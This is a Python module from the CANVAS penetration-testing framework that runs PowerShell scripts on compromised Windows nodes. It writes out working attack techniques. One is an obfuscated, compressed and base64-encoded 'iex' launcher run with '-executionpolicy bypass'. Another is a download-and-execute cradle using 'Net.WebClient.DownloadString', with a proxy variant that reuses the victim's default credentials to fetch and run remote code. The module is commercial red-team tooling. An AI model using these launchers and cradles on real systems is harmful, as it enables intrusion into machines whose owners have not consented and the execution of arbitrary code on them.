#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import zlib
import base64
import os,getopt
import socket
import locale
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import canvasengine
import logging

NAME                            = "runpowershellscript"
DESCRIPTION                     = "Run a PowerShell script on a PowerShell node"
VERSION                         = "2.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = "This module run a powershell script on a powershell node. You have the option to save the script on disk and execute it or just running on the fly. The 2.0 version includes the option for run a script hosted on a remote server. Also includes proxy support for use in case the target host is routing all traffic throught a web proxy"
DOCUMENTATION["Commandline"]    = "runmodule runpowershellscript -O option_value:Local -O filename:myscript -O copytodisk:True|False \nrunmodule runpowershellscript -O option_value:Remote -O url:myurl -O proxy:True|False"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.option         = None
        self.copytodisk     = False
        self.scriptName     = ""
        self.showresults    = True
        self.psBuffer       = None
        self.remote         = False
        self.url            = None 
        self.proxy          = False
        return

    def getargs(self):
        
        self.option         = self.argsDict.get("option_value",    self.option)

        if self.option == "Remote":
            self.remote = True
            self.url            = self.argsDict.get("url",         self.url)
            self.proxy          = self.argsDict.get("proxy",       self.proxy)
        elif self.option == "Local" or not self.option:
            self.remote = False
            self.scriptName     = self.argsDict.get("filename",    self.scriptName)
            self.psBuffer       = self.argsDict.get("PSBuffer",    self.psBuffer)
            self.copytodisk     = self.argsDict.get("copytodisk",  self.copytodisk)
        
        self.showresults    = self.argsDict.get("showresults", self.showresults)

    def make_encoded_command(self, node_ps):
        compressed_content = zlib.compress(node_ps)
        # remove header and footer of the compressed package
        rawchunk = compressed_content[2:-4]
        enc_chunk = base64.b64encode(rawchunk)
        command = "sal x New-Object;iex(x IO.StreamReader((x IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % enc_chunk
        return command

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()
        for node in self.argsDict["passednodes"]:
            ntype = node.nodetype
            shell = node.shell

            if ntype == "PowerShellNode" or ntype in ['win32Node', 'win64Node']:
                
                if not self.remote:
                    #local 
                    if not self.scriptName and not self.psBuffer:
                        logging.warning("You must indicate the filename")
                        self.setInfo("%s - done (failed: You must indicate the filename)" % NAME)
                        return 0
                    
                    #Check if file exists
                    if self.psBuffer:
                        data = self.psBuffer
                    else:
                        try:
                            fp = file(self.scriptName,"rb")
                            data = fp.read()
                            fp.close()
                        except IOError, i:
                            e = "Error reading local file: %s" % str(i)
                            self.setInfo("%s - done (failed: %s)" % (NAME,str(i)))
                            logging.error(e)
                            return 0

                    #Check file encoding - we need to send only UTF-8
                    try:
                        udata = file_utf8_encoding(data)
                    except Exception, i:
                        e = "Error reading file data: %s" % str(i)
                        self.setInfo("%s - done (failed: %s)" % (NAME,str(i)))
                        logging.error(e)
                        return 0

                    if self.copytodisk:
                        try:
                            logging.info("Uploading script: %s" % self.scriptName)
                            upload_result = shell.upload(udata, destfilename=strip_leading_path(self.scriptName), sourceisbuffer=True)
                            logging.info("Upload Result: %s" % upload_result)
                        except Exception, e:
                            self.setInfo("%s - done (failed)" % NAME)
                            logging.error("%s" % str(e) )
                            return 0

                        #self.setInfo("Running script: %s" % self.scriptName)
                        filename = ".\\" if ntype == 'PowerShellNode' else "./"
                        filename += strip_leading_path(self.scriptName)
                        pscommand = "powershell %s" % filename
                        logging.info("Executing script: %s" % filename )
                        self.result += "\n"

                        if ntype in ['win32Node', 'win64Node']:
                            pscommand = "powershell.exe -executionpolicy bypass %s" % filename
                            self.result += shell.runcommand('echo ""|' + pscommand)
                        else:
                            pscommand = "powershell %s" % filename
                            self.result += shell.runcommand(pscommand, True)

                    else:
                        self.result += "\n"
                        if ntype in ['win32Node', 'win64Node']:
                            pscommand = 'powershell.exe -executionpolicy bypass "%s"' % self.make_encoded_command(udata)
                            self.result += shell.runcommand('echo ""|' + pscommand)
                        else:
                            self.result += shell.runcommand(udata, True)

                else:
                    #remote script
                    rdata = "" 
                    if self.proxy:
                        rdata = """
                                $w=new-object system.net.webclient;
                                $proxy=[System.Net.WebRequest]::GetSystemWebProxy();
                                if ($proxy)
                                {   
                                    $w.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();
                                    $w.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
                                }   
                                iex ($w.DownloadString('%s'));
                                """
                    else:
                        rdata = "iex ((New-Object Net.WebClient).DownloadString('%s'));"


                    rdata = rdata % self.url
                    rdata += "write-output 'Succesfull execution' | ? { $? }"
                    self.result += "\n"
                    if ntype in ['win32Node', 'win64Node']:
                        pscommand = 'powershell.exe -executionpolicy bypass "%s"' % self.make_encoded_command(rdata)
                        self.result += shell.runcommand('echo ""|' + pscommand)
                    else:
                        self.result += shell.runcommand(rdata, True)
            else:
                self.setInfo("%s - done (failed: Node not supported)" % NAME)
                logging.error("Node %s not supported" % ntype)
                return 0

        if self.showresults:
            logging.info("Result: %s" % self.result)
        self.setInfo("%s - done (success)" % NAME)

        return 1

